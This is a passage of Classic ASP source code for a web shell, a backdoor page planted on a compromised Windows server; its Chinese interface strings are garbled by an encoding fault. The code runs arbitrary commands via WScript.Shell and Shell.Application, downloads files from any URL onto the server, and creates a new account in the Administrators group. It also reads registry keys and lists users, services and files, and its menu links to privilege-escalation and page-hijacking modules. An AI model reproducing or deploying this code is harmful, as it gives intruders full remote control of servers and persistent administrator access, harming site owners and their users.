Next
RRS "</td></tr></table>"
rs.Close
 Else
 If sql <> "" Then
conn.Execute(sql)
chkErr(Err)
RRS "<center><br>ִ�����!</center>"
End If
End If
RRS "</form><hr/>"
conn.Close
Set rs=Nothing
Set conn=Nothing
Set rsTable=Nothing
End Sub

Function getDataType(typeId)
Select Case typeId
Case 130
getDataType="�ı�"
Case 2
getDataType="����"
Case 3
getDataType="������"
Case 7
getDataType="����/ʱ��"
Case 5
getDataType="˫������"
Case 11
getDataType="��/��"
Case 128
getDataType="OLE ����"
Case Else
getDataType=typeId
End Select
End Function
Sub accessInject()
If isDebugMode=False Then
On Error Resume Next
End If
Dim rs, conn, sqlStr, connStr
sqlStr=Request("sqlStr")
If LCase(Left(sqlStr, 4))="sql:" Then
showErr("����ֻ��ACCESS���ݿ���Ч!")
 Else
connStr="Provider=Microsoft.Jet.Oledb.4.0;Data Source=" & sqlStr
End If
Set rs=Server.CreateObject("Adodb.RecordSet")
Set conn=Server.CreateObject("Adodb.Connection")
conn.Open connStr
chkErr(Err)
If notdownloadsExists=True Then
conn.Execute("drop table notdownloads")
End If
conn.Execute("create table notdownloads(notdownloads oleobject)")
rs.Open "notdownloads", conn, 1, 3
rs.AddNew
rs.Update
rs.Close

RRS "<script language=""javascript"">alert('����ɹ�!');history.back();</script>"

conn.Close
Set rs=Nothing
Set conn=Nothing
End Sub

Function getTableList(conn, sqlStr, rsTable)
Set rsTable=conn.OpenSchema(20, Array(Empty, Empty, Empty, "table"))
Do Until rsTable.Eof
getTableList=getTableList & "<a href=""?pageName=MsDataBase&theAct=query&sqlStr=" & UrlEncode(sqlStr) & "&theTable=" & UrlEncode(rsTable("Table_Name")) & """>[" & rsTable("Table_Name") & "]</a>&nbsp;"
rsTable.MoveNext
Loop
rsTable.MoveFirst
End Function
Sub PageObjOnSrv()
Dim i, objTmp, txtObjInfo, strObjectList, strDscList
txtObjInfo=Trim(Request("txtObjInfo"))
strObjectList="MSWC.AdRotator,MSWC.BrowserType,MSWC.NextLink,MSWC.Tools,MSWC.Status,MSWC.Counters,IISSample.ContentRotator," & _
"IISSample.PageCounter,MSWC.PermissionChecker,Adodb.Connection,SoftArtisans.FileUp,SoftArtisans.FileManager,LyfUpload.UploadFile," & _
"Persits.Upload.1,W3.Upload,JMail.SmtpMail,CDONTS.NewMail,Persits.MailSender,SMTPsvg.Mailer,DkQmail.Qmail,Geocel.Mailer," & _
"IISmail.Iismail.1,SmtpMail.SmtpMail.1,SoftArtisans.ImageGen,W3Image.Image," & _
"Scripting.FileSystemObject,Adodb.Stream,Shell.Application,WScript.Shell,Wscript.Network"
strDscList="����ֻ�,�������Ϣ,�������ӿ�,,,������,��������,,Ȩ�޼��,ADO ���ݶ���,SA-FileUp �ļ��ϴ�,SoftArtisans �ļ�����," & _
 "���Ʒ���ļ��ϴ����,ASPUpload �ļ��ϴ�,Dimac �ļ��ϴ�,Dimac JMail �ʼ��շ�,���� SMTP ����,ASPemail ����,ASPmail ����,dkQmail ����," & _
 "Geocel ����,IISmail ����,SmtpMail ����,SA ��ͼ���д,Dimac ��ͼ���д���," & _
 "FSO,Stream ��,,,"
aryObjectList=Split(strObjectList, ",")
aryDscList=Split(strDscList, ",")
showTitle("���������֧��������")
RRS "�������֧��������<br/>"
RRS "��������������������Ҫ���������ProgId��ClassId��<br/>"
RRS "<form method=post>"
RRS "<input name=txtObjInfo size=30 value=""" & txtObjInfo & """><input name=theAct type=submit value=��Ҫ���>"
RRS "</form>"
If Request("theAct")="��Ҫ���" And txtObjInfo <> "" Then
Call getObjInfo(txtObjInfo, "")
End If

RRS "<hr/>"
RRS "<lu>������� �� ֧�ּ�����"
For i=0 To UBound(aryDscList)
Call getObjInfo(aryObjectList(i), aryDscList(i))
Next
RRS "</lu><hr/>"
End Sub

Sub getObjInfo(strObjInfo, strDscInfo)
Dim objTmp
If isDebugMode=False Then
On Error Resume Next
End If
RRS "<li> " & strObjInfo
If strDscInfo <> "" Then
RRS " (" & strDscInfo & "���)"
End If
RRS " �� "
Set objTmp=Server.CreateObject(strObjInfo)
If Err <> -2147221005 Then
RRS "�� "
RRS "Version: " & objTmp.Version & "; "
RRS "About: " & objTmp.About
 Else
RRS "��"
End If
RRS "</li>"
If Err Then
Err.Clear
End If

Set objTmp=Nothing
End Sub
Sub PageOtherTools()
Dim theAct
theAct=Request("theAct")
showTitle("һЩ�����С����")
Select Case theAct
Case "downFromUrl"
downFromUrl()
Response.End
Case "addUser"
AddUser Request("userName"), Request("passWord")
Response.End
Case "readReg"
readReg()
Response.End
End Select
RRS "����ת��:<hr/>"
RRS "<input name=text1 value=�ַ�������ת10��16���� size=25 id=text9>"
RRS "<input type=button onclick=main(); value=����ת>"
RRS "<input value=16����ת10���ƺ��ַ� size=25 id=vars>"
RRS "<input type=button onClick=main2(); value=����ת>"
RRS "<hr/>"

RRS "���ص�������:<hr/>"
RRS "<form method=post target=main>"
RRS "<input name=theUrl value='http://' size=80><input type=submit value=' ���� '><br/>"
RRS "<input name=thePath value=""" & HtmlEncode(Server.MapPath(".")) & """ size=80>"
RRS "<input type=checkbox name=overWrite value=2>���ڸ���"
RRS "<input type=hidden value=downFromUrl name=theAct>"
RRS "</form>"
RRS "<hr/>"
RRS "�ļ�:<hr/>"
RRS "<form method=post action='?' target=main>"
RRS "<input size=80 name=thePath value=""" & HtmlEncode(Request.ServerVariables("PATH_TRANSLATED")) & """>"
RRS "<input type=hidden value=showEdit name=theAct>"
RRS "<select name=pageName><option value=AppFileExplorer>��Stream</option><option value=FsoFileExplorer>��FSO</option></select>"
RRS "<input type=submit value=' �� '>"
RRS "</form><hr/>"

RRS "�����ʺ����(�ɹ��ʼ���):<hr/>"
RRS "<form method=post target=main>"
RRS "<input type=hidden value=addUser name=theAct>"
RRS "<input name=userName value='HYTop' size=39>"
RRS "<input name=passWord type=password value='HYTop' size=39>"
RRS "<input type=submit value=' ��� '>"
RRS "</form><hr/>"

RRS "ע����ֵ��ȡ(<a href=javascript:showHideMe(regeditInfo);>����</a>):<hr/>"
RRS "<form method=post target=main>"
RRS "<input type=hidden value=readReg name=theAct>"
RRS "<input name=thePath value='HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName\ComputerName' size=80>"
RRS "<input type=submit value=' ��ȡ '>"
RRS "<span id=regeditInfo style='display:none;'><hr/>"
RRS "HKLM\Software\Microsoft\Windows\CurrentVersion\Winlogon\Dont-DisplayLastUserName,REG_SZ,1 {����ʾ�ϴε�¼�û�}<br/>"
RRS "HKLM\SYSTEM\CurrentControlSet\Control\Lsa\restrictanonymous,REG_DWORD,0 {0=ȱʡ,1=�����û��޷��оٱ����û��б�,2=�����û��޷����ӱ���IPC$����}<br/>"
RRS "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters\AutoShareServer,REG_DWORD,0 {��ֹĬ�Ϲ���}<br/>"
RRS "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters\EnableSharedNetDrives,REG_SZ,0 {�ر����繲��}<br/>"
RRS "HKLM\SYSTEM\currentControlSet\Services\Tcpip\Parameters\EnableSecurityFilters,REG_DWORD,1 {����TCP/IPɸѡ(����������)}<br/>"
RRS "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\IPEnableRouter,REG_DWORD,1 {����IP·��}<br/>"
RRS "-------�����ƺ�Ҫ���󶨵�����,��֪���Ƿ�׼ȷ---------<br/>"
RRS "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\DefaultGateway,REG_MUTI_SZ {Ĭ������}<br/>"
RRS "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\NameServer {��DNS}<br/>"
RRS "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\TCPAllowedPorts {�����TCP/IP�˿�}<br/>"
RRS "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\UDPAllowedPorts {�����UDP�˿�}<br/>"
RRS "-----------OVER--------------------<br/>"
RRS "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Enum\Count {����������}<br/>"
RRS "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Linkage\Bind {��ǰ����������(��������滻)}<br/>"
RRS "==========================================================<br/>����������kEvin1986�ṩ"
RRS "</span>"
RRS "</form><hr/>"

RRS "<script language=vbs>" & vbNewLine
RRS "sub main()" & vbNewLine
RRS "base=document.all.text9.value" & vbNewLine
RRS "If IsNumeric(base) Then" & vbNewLine
RRS "cc=hex(cstr(base))" & vbNewLine
RRS "alert(""10����Ϊ""&base)" & vbNewLine
RRS "alert(""16����Ϊ""&cc)" & vbNewLine
RRS "exit sub" & vbNewLine
RRS "end if" & vbNewLine
RRS "aa=asc(cstr(base))" & vbNewLine
RRS "bb=hex(aa)" & vbNewLine
RRS "alert(""10����Ϊ""&aa)" & vbNewLine
RRS "alert(""16����Ϊ""&bb)" & vbNewLine
RRS "end sub" & vbNewLine
RRS "sub main2()" & vbNewLine
RRS "If document.all.vars.value<>"""" Then" & vbNewLine
RRS "Dim nums,tmp,tmpstr,i" & vbNewLine
RRS "nums=document.all.vars.value" & vbNewLine
RRS "nums_len=Len(nums)" & vbNewLine
RRS "For i=1 To nums_len" & vbNewLine
RRS "tmp=Mid(nums,i,1)" & vbNewLine
RRS "If IsNumeric(tmp) Then" & vbNewLine
RRS "tmp=tmp * 16 * (16^(nums_len-i-1))" & vbNewLine
RRS "Else" & vbNewLine
RRS "If ASC(UCase(tmp))<65 Or ASC(UCase(tmp))>70 Then" & vbNewLine
RRS "alert(""���������ֵ���зǷ��ַ���16������ֻ����1��9��a��f֮����ַ������������롣"")" & vbNewLine
RRS "exit sub" & vbNewLine
RRS "End If" & vbNewLine
RRS "tmp=(ASC(UCase(tmp))-55) * (16^(nums_len-i))" & vbNewLine
RRS "End If" & vbNewLine
RRS "tmpstr=tmpstr+tmp" & vbNewLine
RRS "Next" & vbNewLine
RRS "alert(""ת����10����Ϊ:""&tmpstr&""���ַ�ֵΪ:""&chr(tmpstr))" & vbNewLine
RRS "End If" & vbNewLine
RRS "end sub" & vbNewLine
RRS "</script>" & vbNewLine
End Sub

Sub downFromUrl()
If isDebugMode=False Then
On Error Resume Next
End If
Dim Http, theUrl, thePath, stream, fileName, overWrite
theUrl=Request("theUrl")
thePath=Request("thePath")
overWrite=Request("overWrite")
Set stream=Server.CreateObject("Adodb.Stream")
Set Http=Server.CreateObject("MSXML2.XMLHTTP")

If overWrite <> 2 Then
overWrite=1
End If

Http.Open "GET", theUrl, False
Http.Send()
If Http.ReadyState <> 4 Then 
Exit Sub
End If

With stream
.Type=1
.Mode=3
.Open
.Write Http.ResponseBody
.Position=0
.SaveToFile thePath, overWrite
If Err.Number=3004 Then
Err.Clear
fileName=Split(theUrl, "/")(UBound(Split(theUrl, "/")))
If fileName="" Then
fileName="index.htm.txt"
End If
thePath=thePath & "\" & fileName
.SaveToFile thePath, overWrite
End If
.Close
End With
chkErr(Err)

alertThenClose("�ļ� " & Replace(thePath, "\", "\\") & " ���سɹ�!")

Set Http=Nothing
Set Stream=Nothing
End Sub

Sub AddUser(strUser, strPassword)
If isDebugMode=False Then
On Error Resume Next
End If
Dim computer, theUser, theGroup
Set computer=Getobject("WinNT://.")
Set theGroup=GetObject("WinNT://./Administrators,group")

Set theUser=computer.Create("User", strUser)
theUser.SetPassword(strPassword)
chkErr(Err)
theUser.SetInfo
chkErr(Err)
theGroup.Add theUser
chkErr(Err)

Set theUser=Nothing
Set computer=Nothing
Set theGroup=Nothing

RRS getUserInfo(strUser)
End Sub

Sub readReg()
If isDebugMode=False Then
On Error Resume Next
End If
Dim i, thePath, theArray
thePath=Request("thePath")
theArray=wsX.RegRead(thePath)
If IsArray(theArray) Then
For i=0 To UBound(theArray)
RRS "<li>" & theArray(i)
Next
 Else
RRS "<li>" & theArray
End If
chkErr(Err)
End Sub

Sub iframe()
RRS "<html><head><title>"&myName&"</title><style>body{margin:0px;}</style></head>"
RRS "<body margin='0' scroll='no'><table width='100%' height='100%'  border='0' cellpadding='0' cellspacing='0'><tr><td width='180'><iframe name='Left' src='?pageName=PageList' width='100%' height='100%' frameborder='2' scrolling='auto'></iframe></td><td><div style='padding:2px;width:100%;height:100%;background-color:#555'><iframe name='main' src='?pageName=ShiSan' width='100%' height='100%' frameborder='1' scrolling='auto'></iframe></div></td></tr></table></body></html>"
End Sub
Sub PageList()
showTitle("����ģ���б�")
RRS "<base target=main>"
RRS "<center><br><b>"&myName&"</b></center><hr/>"
RRS "<ol style='line-height:12px;'>"
RRS "<li style='line-height:16px;'><b><a href='?pageName=infoAboutSrv' target='main'>�������������</a></b><br/>"
RRS "<a href='?pageName=infoAboutSrv&theAct=getTerminalInfo'>�ն˶˿�&�Զ���¼</a><br />"
RRS "<a href='?pageName=ServiceList' target='main'>ϵͳ ����</a><br />"
RRS "<a href='?pageName=objOnSrv'>���������</a><br />"
RRS "<a href='?pageName=CSInfo'>�ͻ��˷�����������Ϣ</a><br /><br /></li>"
RRS "<li style='line-height:16px;'><b>ִ��������</b><br/>"
RRS "<a href='?pageName=WsCmdRun'>WScript.Shell</a><br />"
RRS "<a href='?pageName=SaCmdRun'>Shell.Application</a><br /><br /></li>"
RRS "<li style='line-height:16px;'><b>�ļ�Ŀ¼������޸�</b><br/>"
RRS "<a href='?pageName=FsoFileExplorer'>F S O</a><br />"
RRS "<a href='?pageName=AppFileExplorer'>Shell.Application</a><br />"
RRS "<a href='?pageName=FsoFileExplorer&thePath=C%3A%5CDocuments+and+Settings%5C'>C:\Documents.</a><br />"
RRS "<a href='?pageName=FsoFileExplorer&thePath=C%3A%5CProgram+Files%5C'>C:\Program Files</a><br /><br /></li>"
RRS "<li><a href='?pageName=kmuma'>�����ļ�+ľ��</a><br /><br /></li>"
RRS "<li><a href='?pageName=plgm'>��������(���ٰ�)</a><br /><br /></li>"
RRS "<li><a href='?pageName=plgm1'><b>��������(��ǿ��)</b></a><br /><br /></li>"
RRS "<li><a href='?pageName=Servu'>Servu��Ȩ-�ӹ���Ա</a><br /><br /></li>"
RRS "<li><a href='?pageName=userList'>ϵͳ�û� �û���</a><br /><br /></li>"
RRS "<li><a href='?pageName=PageAddToMdb'>�ļ��д��/�⿪��</a><br /><br /></li>"
RRS "<li><a href='?pageName=MsDataBase'>���ݿ�鿴/����</a><br /><br /></li>"
RRS "<li><a href='?pageName=TxtSearcher'>�ı��ļ�������</a><br /><br /></li>"
RRS "<li><a href='?pageName=OtherTools'>һЩС����</a><br /><br /></li></ol>"
RRS "<div align=center><font color=red>ע������ʹ���ڷǷ�<br>������߸Ų�����<font></div>"
End Sub
Sub PageSaCmdRun()
If isDebugMode=False Then
On Error Resume Next
End If
Dim theFile, thePath, theAct, appPath, appName, appArgs
showTitle("Shell.Application�����в���")
theAct=Trim(Request("theAct"))
appPath=Trim(Request("appPath"))
thePath=Trim(Request("thePath"))
appName=Trim(Request("appName"))
appArgs=Trim(Request("appArgs"))
If theAct="doAct" Then
If appName="" Then
appName="cmd.exe"
End If
If appPath <> "" And Right(appPath, 1) <> "\" Then
appPath=appPath & "\"
End If

If LCase(appName)="cmd.exe" And appArgs <> "" Then
If LCase(Left(appArgs, 2)) <> "/c" Then
appArgs="/c " & appArgs
End If
Else
If LCase(appName)="cmd.exe" And appArgs="" Then
appArgs="/c "
End If
End If

saX.ShellExecute appName, appArgs, appPath, "", 0
chkErr(Err)
End If

If theAct="readResult" Then
Err.Clear
RRS encode(streamLoadFromFile(aspPath))
If Err Then
Set theFile=fsoX.OpenTextFile(aspPath)
RRS encode(theFile.ReadAll())
Set theFile=Nothing
End If
Response.End
End If

RRS "<style>body{margin:0;border:none;background-color:buttonface;}</style>"
RRS "<body onload=""document.forms[0].appArgs.focus();setTimeout('wsLoadIFrame();', 3900);"">"
RRS "<form method=post onSubmit='this.Submit.disabled=true'>"
RRS "<input type=hidden name=theAct value=doAct>"
RRS "<input type=hidden name=aspPath value=""" & HtmlEncode(aspPath) & """>"
RRS "����·��: <input name=appPath type=text id=appPath value=""" & HtmlEncode(appPath) & """ size=62><br/>"
RRS "�����ļ�: <input name=appName type=text id=appName value=""" & HtmlEncode(appName) & """ size=62> "
RRS "<input type=button name=Submit4 value=' ���� ' onClick=""this.form.appArgs.value+=' > '+this.form.aspPath.value;""><br/> "
RRS "�������: <input name=appArgs type=text id=appArgs value=""" & HtmlEncode(appArgs) & """ size=62> "
RRS "<input type=submit name=Submit value=' ���� '><br/>"
RRS "<hr/>ע: ֻ�������г�����CMD.EXE���л����²ſ��Խ�����ʱ�ļ�����(����"">""����),��������ֻ��ִ�в��ܻ���.<br/>"
RRS "��&nbsp; ��������ִ��ʱ��ͬ��ҳˢ��ʱ�䲻ͬ��,������Щִ��ʱ�䳤�ĳ�������Ҫ�ֶ�ˢ�������iframe���ܵõ�.���Ժ�ǵ�ɾ����ʱ�ļ�.<hr/>"
RRS "<iframe id=cmdResult style='width:100%;height:78%;'>"
RRS "</iframe>"
RRS "</form>"
RRS "</body>"
End Sub
Sub PageServiceList()
Dim sa, objService, objComputer

showTitle("ϵͳ������Ϣ�鿴")
Set objComputer=GetObject("WinNT://.")
Set sa=Server.CreateObject("Shell.Application")
objComputer.Filter=Array("Service")

RRS "<ol>"
If isDebugMode=False Then
On Error Resume Next
End If
For Each objService In objComputer
RRS "<li>" & objService.Name & "</li><hr/>"
RRS "<ol>��������: " & objService.Name & "<br/>"
RRS "��ʾ����: " & objService.DisplayName & "<br/>"
RRS "��������: " & getStartType(objService.StartType) & "<br/>"
RRS "����״̬: " & sa.IsServiceRunning(objService.Name) & "<br/>"
RRS "��ǰ״̬: " & objService.Status & "<br/>"
RRS "��������: " & objService.ServiceType & "<br/>"
RRS "��¼���: " & objService.ServiceAccountName & "<br/>"
RRS "��������: " & getServiceDsc(objService.Name) & "<br/>"
RRS "�ļ�·��������: " & objService.Path
RRS "</ol><hr/>"
Next
RRS "</ol><hr/>"

Set sa=Nothing
End Sub

Function getServiceDsc(strService)
Dim ws
Set ws=Server.CreateObject("WScript.Shell")
getServiceDsc=ws.RegRead("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\" & strService & "\Description")
Set ws=Nothing
End Function

Sub PageTxtSearcher()
Response.Buffer=True
Server.ScriptTimeOut=5000
Dim keyword, theAct, thePath, theFolder
theAct=Request("theAct")
keyword=Trim(Request("keyword"))
thePath=Trim(Request("thePath"))

showTitle("�ı��ļ�������")

If thePath="" Then
thePath=Server.MapPath("\")
End If

RRS "FSO�ļ�����:"
RRS "<hr/>"
RRS "<form name=form1 method=post action=?pageName=TxtSearcher&theAct=fsoSearch onsubmit=this.Submit.disabled=true>"
RRS "·��: <input name=thePath type=text value=""" & HtmlEncode(thePath) & """ id=thePath size=61><br/>"
RRS "�ؼ���: <input name=keyword type=text value=""" & HtmlEncode(keyword) & """ id=keyword size=60>"
RRS "<input type=submit name=Submit value=������>"
RRS "</form>"
RRS "<hr/>"
RRS "Shell.Application &amp; Adodb.Stream�ļ�����:"
RRS "<hr/>"
RRS "<form name=form1 method=post action=?pageName=TxtSearcher&theAct=saSearch onsubmit=this.Submit2.disabled=true>"
RRS "·��: <input name=thePath type=text value=""" & HtmlEncode(thePath) & """ id=thePath size=61><br/>"
RRS "�ؼ���: <input name=keyword type=text value=""" & HtmlEncode(keyword) & """ id=keyword size=60>"
RRS "<input type=submit name=Submit2 value=������>"
RRS "</form>"
RRS "<hr/>"

If theAct="fsoSearch" And keyword <> "" Then
Set theFolder=fsoX.GetFolder(thePath)
Call searchFolder(theFolder, keyword)
Set theFolder=Nothing
End If

If theAct="saSearch" And keyword <> "" Then
Call appSearchIt(thePath, keyword)
End If
RRS "<hr/>"
End Sub

Sub searchFolder(folder, str)
Dim ext, title, theFile, theFolder
For Each theFile In folder.Files
ext=LCase(Split(theFile.Path, ".")(UBound(Split(theFile.Path, "."))))
If InStr(LCase(theFile.Name), LCase(str)) > 0 Then
RRS fileLink(theFile, "")
End If
If ext="asp" Or ext="asa" Or ext="cer" Or ext="cdx" Then
If searchFile(theFile, str, title, "fso") Then
RRS fileLink(theFile, title)
End If
End If
Next
Response.Flush()
For Each theFolder In folder.subFolders
searchFolder theFolder, str
Next
end sub

Function searchFile(f, s, title, method)
If isDebugMode=False Then
On Error Resume Next
End If
Dim theFile, content, pos1, pos2

If method="fso" Then
Set theFile=fsoX.OpenTextFile(f.Path)
content=theFile.ReadAll()
theFile.Close
Set theFile=Nothing
 Else
content=streamLoadFromFile(f.Path)
End If

If Err Then
Err.Clear
content=""
End If

searchFile=InStr(1, content, S, vbTextCompare) > 0 
If searchFile Then
pos1=InStr(1, content, "<TITLE>", vbTextCompare)
pos2=InStr(1, content, "</TITLE>", vbTextCompare)
title=""
If pos1 > 0 And pos2 > 0 Then
title=Mid(content, pos1 + 7, pos2 - pos1 - 7)
End If
End If
End Function

Function fileLink(f, title)
fileLink=f.Path
If title="" Then
title=f.Name
End If
fileLink="<li><font color=ff0000>" & title & "</font> " & fileLink & "</li>"
End Function

Sub appSearchIt(thePath, theKey)
Dim title, extName, objFolder, objItem, fileName
Set objFolder=saX.NameSpace(thePath)

For Each objItem In objFolder.Items
If objItem.IsFolder=True Then
Call appSearchIt(objItem.Path, theKey)
Response.Flush()
Else
extName=LCase(Split(objItem.Path, ".")(UBound(Split(objItem.Path, "."))))
fileName=Split(objItem.Path, "\")(UBound(Split(objItem.Path, "\")))
If InStr(LCase(fileName), LCase(theKey)) > 0 Then
RRS fileLink(objItem, "")
End If
If extName="asp" Or extName="asa" Or extName="cer" Or extName="cdx" Then
If searchFile(objItem, theKey, title, "application") Then
RRS fileLink(objItem, title)
End If
End If
End If
Next
End Sub

Sub PageUserList()
Dim objUser, objGroup, objComputer

showTitle("ϵͳ�û����û�����Ϣ�鿴")
Set objComputer=GetObject("WinNT://.")
objComputer.Filter=Array("User")
RRS "<a href=javascript:showHideMe(userList);>User:</a>"
RRS "<span id=userList><hr/>"
For Each objUser in objComputer
RRS "<li>" & objUser.Name & "</li>"
RRS "<ol><hr/>"
getUserInfo(objUser.Name)
RRS "<hr/></ol>"
Next
RRS "</span>"

RRS "<br/><a href=javascript:showHideMe(userGroupList);>UserGroup:</a>"
RRS "<span id=userGroupList><hr/>"
objComputer.Filter=Array("Group")
For Each objGroup in objComputer
RRS "<li>" & objGroup.Name & "</li>"
RRS "<ol><hr/>" & objGroup.Description & "<hr/></ol>"
Next
RRS "</span><hr/>"

End Sub

Sub getUserInfo(strUser)
Dim User, Flags
If isDebugMode=False Then
On Error Resume Next
End If
Set User=GetObject("WinNT://./" & strUser & ",user")
RRS "����: " & User.Description & "<br/>"
RRS "�����û���: " & getItsGroup(strUser) & "<br/>"
RRS "�����ѹ���: " & cbool(User.Get("PasswordExpired")) & "<br/>"
Flags=User.Get("UserFlags")
RRS "������������: " & cbool(Flags And &H10000) & "<br/>"
RRS "�û����ܸ�������: " & cbool(Flags And &H00040) & "<br/>"
RRS "��ȫ���ʺ�: " & cbool(Flags And &H100) & "<br/>"
RRS "�������С����: " & User.PasswordMinimumLength & "<br/>"
RRS "�Ƿ�Ҫ��������: " & User.PasswordRequired & "<br/>"
RRS "�ʺ�ͣ����: " & User.AccountDisabled & "<br/>"
RRS "�ʺ�������: " & User.IsAccountLocked & "<br/>"
RRS "�û���Ϣ�ļ�: " & User.Profile & "<br/>"
RRS "�û���¼�ű�: " & User.LoginScript & "<br/>"
RRS "�û�HomeĿ¼: " & User.HomeDirectory & "<br/>"
RRS "�û�HomeĿ¼��: " & User.Get("HomeDirDrive") & "<br/>"
RRS "�ʺŹ���ʱ��: " & User.AccountExpirationDate & "<br/>"
RRS "�ʺ�ʧ�ܵ�¼����: " & User.BadLoginCount & "<br/>"
RRS "�ʺ�����¼ʱ��: " & User.LastLogin & "<br/>"
RRS "�ʺ����ע��ʱ��: " & User.LastLogoff & "<br/>"
For Each RegTime In User.LoginHours
If RegTime < 255 Then
Restrict=True
End If
Next
RRS "�ʺ�����ʱ��: " & Restrict & "<br/>"
Err.Clear
End Sub

Function getItsGroup(strUser)
Dim objUser, objGroup
Set objUser=GetObject("WinNT://./" & strUser & ",user")
For Each objGroup in objUser.Groups
getItsGroup=getItsGroup & " " & objGroup.Name
Next
End Function
Sub PageWsCmdRun()
Dim cmdStr, cmdPath, cmdResult
cmdStr=Request("cmdStr")
cmdPath=Request("cmdPath")

showTitle("WScript.Shell�����в���")

If cmdPath="" Then
cmdPath="cmd.exe"
End If

If cmdStr <> "" Then
If InStr(LCase(cmdPath), "cmd.exe") > 0 Or InStr(LCase(cmdPath), LCase(myCmdDotExeFile)) > 0 Then
cmdResult=doWsCmdRun(cmdPath & " /c " & cmdStr)
Else
 If LCase(cmdPath)="wscriptshell" Then
cmdResult=doWsCmdRun(cmdStr)
 Else
cmdResult=doWsCmdRun(cmdPath & " " & cmdStr)
End If
End If
End If

RRS "<style>body{margin:0;}</style>"
RRS "<body onload=""document.forms[0].cmdStr.focus();document.forms[0].cmdResult.style.height=document.body.clientHeight-115;"">"
RRS "<form method=post onSubmit='this.Submit.disabled=true'>"
RRS "·��: <input name=cmdPath type=text id=cmdPath value=""" & HtmlEncode(cmdPath) & """ size=50> "
RRS "<input type=button name=Submit2 value=ʹ��WScript.Shell onClick=""this.form.cmdPath.value='WScriptShell';""><br/>"
RRS "����/����: <input name=cmdStr type=text id=cmdStr value=""" & HtmlEncode(cmdStr) & """ size=62> "
RRS "<input type=submit name=Submit value=' ���� '><br/>"
RRS "<hr/>ע: ��ֻ������ִ�е�������(����ִ�п�ʼ����������Ҫ�˹���Ԥ),��Ȼ��������޷���������,�����ڷ���������һ�����ɽ����Ľ���.<hr/>"
RRS "<textarea id=cmdResult style='width:100%;height:78%;'>"
RRS HtmlEncode(cmdResult)
RRS "</textarea>"
RRS "</form>"
RRS "</body>"
End Sub

Function doWsCmdRun(cmdStr)
If isDebugMode=False Then
On Error Resume Next
End If
Dim fso, theFile
Set fso=Server.CreateObject("Scripting.FileSystemObject")

doWsCmdRun=wsX.Exec(cmdStr).StdOut.ReadAll()
If Err Then
RRS Err.Description & "<br>"
Err.Clear
wsX.Run cmdStr & " > " & aspPath, 0, True
Set theFile=fso.OpenTextFile(aspPath)
doWsCmdRun=theFile.RealAll()
If Err Then
RRS Err.Description & "<br>"
Err.Clear
doWsCmdRun=streamLoadFromFile(aspPath)
End If
End If

Set fso=Nothing
End Function

Sub PageOther()
RRS "<style>"
RRS "A:visited {color: #fff;text-decoration: none;}"
RRS "A:active {color: #fff;text-decoration: none;}"
RRS "A:link {color: #fff;text-decoration: none;}"
RRS "A:hover {color: #ff0000;text-decoration: none;}"
RRS "BODY {margin:0px;font-size: 9pt;COLOR: #ddd;font-family: ""Courier New"";border: none;background-color: #444;}"
RRS "textarea {font-family: ""Courier New"";font-size: 12px;border-width: 1px;color: #fff;background-color:#000;}"
RRS "table {font-size: 9pt;}"
RRS "form {margin: 0;background-color:#000;}"
RRS "#fsoDriveList span{width: 100px;}"
RRS "#FileList span{width: 90;height: 70;cursor: hand;text-align: center;word-break: break-all;border: 1px solid buttonface;}"
RRS ".anotherSpan{color: #ffffff;width: 90;height: 70;text-align: center;background-color: #0A246A;border: 1px solid #0A246A;}"
RRS ".font{font-size: 35px;line-height: 40px;}"
RRS "#fileExplorerTools {background-color:#000;}"
RRS ".input, input {border-width: 1px;}"
RRS "</style>" & vbNewLine

RRS "<script language=javascript>" & vbNewLine
RRS "function showHideMe(me){" & vbNewLine
RRS "if(me.innerText == ''){" & vbNewLine
RRS "me.innerText='\nNo Contents!';" & vbNewLine
RRS "}" & vbNewLine
RRS "if(me.style.display == 'none'){" & vbNewLine
RRS "me.style.display='';" & vbNewLine
RRS "}else{" & vbNewLine
RRS "me.style.display='none';" & vbNewLine
RRS "}" & vbNewLine
RRS "}" & vbNewLine
RRS "function changeMyClass(me){" & vbNewLine
RRS "if(me.className == ''){" & vbNewLine
RRS "if(usePath.value != '')document.getElementById(usePath.value).className='';" & vbNewLine
RRS "usePath.value=me.id;" & vbNewLine
RRS "status=me.title;" & vbNewLine
RRS "me.className='anotherSpan';" & vbNewLine
RRS "}" & vbNewLine
RRS "}" & vbNewLine
RRS "function changeThePath(me){" & vbNewLine
RRS "location.href='?pageName=' + pageName.value + '&thePath=' + me.id;" & vbNewLine
RRS "}" & vbNewLine
RRS "function fixTheLayer(strObj){" & vbNewLine
RRS "var objStyle=document.getElementById(strObj).style;" & vbNewLine
RRS "objStyle.width=document.body.clientWidth;" & vbNewLine
RRS "objStyle.top=document.body.scrollTop + 2;" & vbNewLine
RRS "}" & vbNewLine
RRS "function openUrl(){" & vbNewLine
RRS "newWin=window.open('?pageName=' + pageName.value + '&theAct=openUrl&thePath=' + usePath.value,'_self');" & vbNewLine
RRS "}" & vbNewLine
RRS "function newOne(){" & vbNewLine
RRS "newWin=window.open('?pageName=' + pageName.value + '&theAct=newOne&thePath=' + truePath.value, '_self', 'menu=no,resizable=yes,height=110,width=300');" & vbNewLine
RRS "}" & vbNewLine
RRS "function editFile(){" & vbNewLine
RRS "newWin=window.open('?pageName=' + pageName.value + '&theAct=showEdit&thePath=' + usePath.value, '_self', 'menu=no,resizable=yes');" & vbNewLine
RRS "}" & vbNewLine
RRS "function appDoAction(act){" & vbNewLine
